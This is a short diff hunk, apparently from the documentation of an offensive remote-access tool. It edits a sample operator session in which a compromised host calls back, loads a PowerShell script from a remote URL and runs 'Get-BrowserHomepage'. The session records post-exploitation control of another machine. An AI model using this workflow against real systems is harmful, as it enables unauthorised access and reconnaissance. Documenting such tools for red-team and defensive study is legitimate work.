@@ -30,7 +30,7 @@ Mr.Un1k0d3r RingZer0 Team
 [*] Waiting for a connection...
 [+] Callback from 10.0.0.144:49758
 (192.168.70.133:RINGZER0\ME):Url >https://home.ringzer0team.com/ps.php
-(https://home.ringzer0team.com/ps.php):Exec >
+(https://home.ringzer0team.com/ps.php):Exec >Get-BrowserHomepage
 
 Start Page
 ----------
